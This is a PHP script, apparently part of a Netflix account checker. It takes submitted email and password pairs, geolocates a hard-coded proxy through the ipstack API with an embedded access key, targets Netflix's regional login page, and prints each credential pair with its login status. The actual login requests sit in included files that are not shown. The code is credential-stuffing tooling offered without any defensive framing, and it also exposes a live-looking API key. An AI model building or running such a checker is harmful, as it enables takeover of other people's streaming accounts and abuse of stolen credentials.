<?php 
    if(isset($_POST['correo']) and isset($_POST['clave'])){
        $proxy = "186.151.118.242";

        $arrayIp = explode(":", $proxy);
        $ip = $arrayIp[0]; 
        $time = 3;

        $ch =   curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://api.ipstack.com/".$ip."?access_key=7d74beceeae0ba004b2e06d89a3af8d4");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $resultado = curl_exec($ch);

        $response = json_decode($resultado, true);
        $codigoPais = $response['country_code'];

        $urlPrincipal = "https://www.netflix.com/".$codigoPais."/login";
        $urlCuenta = "https://www.netflix.com/YourAccount";

        $correo = $_POST['correo'];
        $clave = $_POST['clave'];

        require("configs.php");
        require("token.php");
        
        require("status.php");

        echo "<tr>";
            echo "<td>".$correo."</td>";
            echo "<td>".$clave."</td>";
            echo "<td>".$status."</td>";
        echo "</tr>";

        curl_close($ch);
    }